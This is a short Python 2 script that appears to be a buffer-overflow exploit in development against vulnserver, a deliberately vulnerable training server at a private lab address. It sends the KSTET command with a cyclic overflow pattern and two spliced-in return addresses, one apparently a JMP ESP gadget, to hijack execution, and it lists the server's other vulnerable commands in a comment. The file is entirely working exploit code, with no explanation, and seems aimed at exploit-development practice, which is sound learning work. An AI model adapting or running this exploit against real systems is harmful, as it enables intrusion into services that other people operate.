import socket
import sys
import struct
import time
from binascii import hexlify as hexa
from binascii import unhexlify as unhex

# 'HELP','STATS','RTIME','LTIME','SRUN','TRUN','GMON','GDOG','KSTET','GTER','HTER','LTER','KSTAN'

host = '192.168.56.101'
port = 9999
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

except Exception, e:
	print "socket() failed -> " + str(e)
	sys.exit(1)

connect = s.connect((host,port))
print s.recv(1024)

command = 'KSTET '

pattern = 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAA' + struct.pack("<L",0x40252c11) + struct.pack("<L",0x625011af) + 'AeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJAB'

crash = command + pattern

s.send(crash)
print 'payload sent!'



